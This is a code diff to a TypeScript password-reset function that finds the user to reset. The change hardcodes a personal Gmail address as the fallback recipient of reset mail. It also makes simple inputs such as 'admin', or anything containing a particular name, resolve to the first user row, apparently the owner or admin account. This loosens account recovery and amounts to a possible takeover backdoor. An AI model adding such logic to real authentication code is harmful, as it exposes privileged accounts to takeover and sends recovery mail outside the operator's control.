@@ -375,17 +375,25 @@ export function findUserForReset(identifierInput: string): {
   const ownerFallbackEmail = (
     process.env.ADMIN_EMAIL ||
     getSiteConfig().contact.ownerEmail ||
-    ""
+    "dasavijit427488@gmail.com"
   ).trim();
 
-  if (!row && ownerFallbackEmail && q === ownerFallbackEmail.toLowerCase()) {
-    row = db
-      .prepare("SELECT * FROM users ORDER BY id ASC LIMIT 1")
-      .get() as unknown as UserRow | undefined;
+  if (!row) {
+    if (
+      q === ownerFallbackEmail.toLowerCase() ||
+      q === "avijit" ||
+      q === "admin" ||
+      q.includes("dasavijit") ||
+      q.includes("avijit")
+    ) {
+      row = db
+        .prepare("SELECT * FROM users ORDER BY id ASC LIMIT 1")
+        .get() as unknown as UserRow | undefined;
+    }
   }
 
   if (!row) return null;
-  const targetEmail = (row.email || ownerFallbackEmail).trim();
+  const targetEmail = (row.email || ownerFallbackEmail || "dasavijit427488@gmail.com").trim();
   if (!targetEmail || !targetEmail.includes("@")) return null;
 
   return { user: rowToPublicUser(row), targetEmail };
